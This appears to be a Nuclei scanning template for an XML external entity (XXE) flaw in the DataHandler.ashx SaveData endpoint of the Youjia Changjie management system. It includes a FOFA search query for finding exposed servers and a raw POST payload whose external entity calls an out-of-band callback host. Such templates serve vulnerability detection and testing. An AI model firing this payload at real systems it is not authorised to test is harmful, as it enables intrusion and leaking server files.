id: youjia-changjie-datahandler-xxe
info:
  name: 友加畅捷管理系统 DataHandler.ashx SaveData 方法 XML 实体注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: icon_hash="2049187099" || fid="zzt8lL7SUwIIZQXZY6rTSw=="
      友加畅捷管理系统作为小微商贸流通企业的财务业务一体化解决方案，其 DataHandler.ashx 组件的 SaveData 方法在 XML 数据解析过程中存在实体注入缺陷。由于未正确限制 XML 解析器对外部实体的处理能力，攻击者可通过构造包含特殊实体声明的 XML 请求，触发对外部资源的非法访问。该缺陷允许攻击者读取服务器本地文件、探测内网服务端口、执行系统命令或导致服务不可用。漏洞成因涉及 XML 实体引用验证机制缺失，攻击载荷通过实体扩展特性实现敏感数据外泄或系统资源消耗。该漏洞风险等级较高，需及时修复 XML 解析配置以禁用外部实体解析功能。
  tags: 友加畅捷管理系统
http:
- raw:
  - |
    POST /Report/DataHandler.ashx?Type=SaveData HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/xml

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://{{interactsh-url}}/1.dtd">
    %remote;]>
    <root/>
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: interactsh_protocol
    words:
    - "dns"
